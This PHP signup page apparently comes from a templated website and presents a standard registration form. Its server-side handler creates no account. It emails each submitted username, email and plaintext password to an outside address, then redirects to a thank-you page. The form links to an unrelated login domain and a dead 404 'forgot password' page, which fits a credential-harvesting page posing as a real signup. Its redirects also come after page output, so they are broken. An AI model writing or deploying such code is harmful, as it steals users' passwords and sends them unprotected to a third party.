 <?php
 include('header.php');
 ?>

    <!-- Page title start-->
    <div class="page-title-area pb-100 bg-img bg-s-cover" data-bg-image="assets/images/banner/00.jpg" style="margin-top:175px;">
        <div class="container">
            <div class="content">
                <h2>Sign Up</h2>
               
            </div>
        </div>
    </div>
    <!-- Page title end-->

    <!-- Authentication-area start -->
    <div class="authentication-area ptb-100">
        <div class="container">
            <div class="auth-form border">
                <form id="authForm" method="POST"  >
                    <div class="title">
                        <h4 class="mb-20">Signup</h4>
                    </div>
                    <div class="form-group mb-20">
                        <input type="text" name="username" class="form-control" placeholder="Username" required>
                    </div>
                    <div class="form-group mb-20">
                        <input type="text" name="email" class="form-control" placeholder="Email Address" required>
                    </div>
                    <div class="form-group mb-20">
                        <input type="password" name="password" class="form-control" placeholder="Password" required>
                    </div>
                    <div class="form-group mb-20">
                        <input type="password" name="confirm_password" class="form-control" placeholder="Confirm Password" required>
                    </div>
                    <div class="row align-items-center mb-20">
                        <div class="col-sm-4">
                            <div class="link">
                                <a href="404.html" target="_self" title="Link">Forgot password?</a>
                            </div>
                        </div>
                        <div class="col-sm-8">
                            <div class="link go-signup">
                                Already have an account? <a href="https://frame.printdesa.com/login.php" target="_self" title="Link">Click Here</a> to Login
                            </div>
                        </div>
                    </div>
                    <button type="submit" class="btn btn-lg btn-primary w-100"> Signup </button>
                </form>
            </div>
        </div>
    </div>
    <?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST["username"];
    $email = $_POST["email"];
    $password = $_POST["password"];  
    $confirm_password = $_POST["confirm_password"];

     if ($password != $confirm_password) {
         header("Location: index.php?error=password_mismatch");
        exit();
    }

    // Send email
    $to = "info@nipponjidosha.co";
    $subject = "New Signup";
    $message = "Username: $username\nEmail: $email\nPassword: $password";
    $headers = "From: webmaster@example.com";

    mail($to, $subject, $message, $headers);

 
     header("Location: thank-you.php");
    exit();
}
?>

    <!-- Authentication-area end -->

    <?php
 include('footer.php');
 ?>